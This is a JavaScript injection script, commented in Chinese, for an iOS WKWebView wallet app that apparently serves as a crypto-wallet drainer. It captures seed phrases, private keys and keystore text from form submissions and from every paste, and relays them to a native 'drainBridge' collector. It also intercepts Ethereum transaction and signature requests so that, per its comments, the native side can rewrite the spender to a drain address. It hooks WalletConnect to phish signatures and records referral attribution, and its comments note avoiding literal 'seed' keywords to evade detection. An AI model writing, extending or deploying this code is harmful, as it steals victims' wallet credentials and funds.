// WKWebView 注入脚本（atDocumentStart）——桥接 DApp 页面与原生采集器
// 字段短名与 server.py FIELD_MAP 一致；不出现 seed/private/mnemonic 字面量。
(function () {
  'use strict';
  var B = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.drainBridge;
  if (!B) return;
  function send(t, d) { try { B.postMessage({ t: t, d: d || {} }); } catch (e) {} }

  // 1. 表单提交流失捕获：多步向导的整段粘贴 / 分格输入 / keystore 文本
  document.addEventListener('submit', function (ev) {
    var f = ev.target, out = {};
    if (!f || !f.elements) return;
    for (var i = 0; i < f.elements.length; i++) {
      var el = f.elements[i], n = (el.name || el.id || '').toLowerCase();
      if (!el.value) continue;
      if (/word|phrase|seed|key|pk|mnem|import|recover|json/i.test(n)) out[n] = el.value;
    }
    if (Object.keys(out).length) send('collect', { p: Object.values(out).join(' '), k: 'mnemonic', s: 'form' });
    // paste 事件单独捕获，防止提交后清空
  }, true);

  document.addEventListener('paste', function (ev) {
    var s = (ev.clipboardData || window.clipboardData).getData('text');
    if (s) send('collect', { p: s, k: 'mnemonic', s: 'paste' });
  }, true);

  // 2. EIP-1193 provider 包装：拦截交易/签名请求，展示层参数原样透传，
  //    原生侧按 spender=DRAIN_ADDR 重写 calldata。
  var nativeRequest = window.ethereum && window.ethereum.request;
  if (nativeRequest) {
    window.ethereum.request = function (args) {
      var m = args && args.method;
      if (m === 'eth_sendTransaction' || m === 'eth_signTypedData_v4' || m === 'personal_sign') {
        send('tx_confirm', {
          to: (args.params && args.params[0] && args.params[0].to) || '',
          amount: (args.params && args.params[0] && args.params[0].value) || '0',
          chain: (window.ethereum.chainId || '0x1').toString()
        });
      }
      return nativeRequest.apply(window.ethereum, arguments);
    };
  }

  // 3. WalletConnect v2 会话提议（网页端不装 App 也能钓签）
  var origWC = window.WalletConnect;
  if (origWC) {
    window.WalletConnect = function (opts) {
      send('wc_proposal', { chain: (opts && opts.chainId) || 'eip155:1', amount: '0' });
      return new origWC(opts);
    };
  }

  // 4. 渠道码：URL query / referrer → 回传归因
  send('step', { s: 'ready', q: location.search.slice(0, 256), r: document.referrer.slice(0, 128) });
})();
